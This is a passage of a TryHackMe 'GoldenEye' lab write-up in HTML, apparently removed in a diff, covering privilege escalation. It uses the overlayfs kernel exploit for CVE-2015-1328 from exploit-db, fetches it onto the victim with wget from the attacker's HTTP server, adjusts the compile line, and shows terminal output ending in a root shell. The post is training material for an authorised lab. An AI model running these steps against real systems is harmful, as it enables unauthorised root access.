-&lt;p&gt;The machine is running linux 3.13.0-32, googeling linux 3.13.0-32 priv esc I found a linux kernal exploit. Details of the exploit can be found &lt;a href=&quot;https://www.cvedetails.com/cve/cve-2015-1328&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I downloaded the &lt;a href=&quot;https://www.exploit-db.com/exploits/37292&quot;&gt;exploit code&lt;/a&gt; from exploit-db and copied it to machine using python.&lt;/p&gt;
-
-&lt;h5 id=&quot;my-machine&quot;&gt;My machine&lt;/h5&gt;
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
-└──╼ $mv ~/Downloads/37292.c .
-┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
-└──╼ $ls
-37292.c  for-007.jpg  nmap  s3cret.txt
-┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
-└──╼ $mv 37292.c exploit.c
-┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
-└──╼ $sudo python3 -m http.server 80
-[sudo] password for daz: 
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h5 id=&quot;victim&quot;&gt;Victim&lt;/h5&gt;
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ wget http://&amp;lt;&amp;lt;machine IP&amp;gt;&amp;gt;/exploit.c
---2021-06-27 04:54:42--  http://&amp;lt;&amp;lt;machine IP&amp;gt;&amp;gt;/exploit.c
-Connecting to &amp;lt;&amp;lt;machine IP&amp;gt;&amp;gt;:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 5119 (5.0K) [text/x-csrc]
-Saving to: 'exploit.c'
-
-100%[======================================&amp;gt;] 5,119       --.-K/s   in 0.003s
-
-2021-06-27 04:54:42 (1.83 MB/s) - 'exploit.c' saved [5119/5119]
-
-www-data@ubuntu:/tmp$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The code provides the compile intructions, I simply need to run gcc and specific the output flag.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ gcc exploit.c exploit
-The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
-www-data@ubuntu:/tmp$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;GCC is not installed however I can use ‘cc’. However for the exploit to work I need to change a line in the file to reference cc rather than gcc.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lib = system(&quot;cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Now the line has changed I can use cc to compile the code.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ cc exploit.c -o exploit
-exploit.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
-}
-^
-exploit.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
-        if(unshare(CLONE_NEWUSER) != 0)
-           ^
-exploit.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
-                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
-                ^
-exploit.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
-            waitpid(pid, &amp;amp;status, 0);
-            ^
-exploit.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
-    wait(NULL);
-    ^
-5 warnings generated.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A few warmming messages are generated however the exploit still works and we get a root shell!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ ./exploit 
-spawning threads
-mount #1
-mount #2
-child threads done
-/etc/ld.so.preload created
-creating shared library
-# id
-uid=0(root) gid=0(root) groups=0(root),33(www-data)
-# 
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Thanks for reading!&lt;/p&gt;
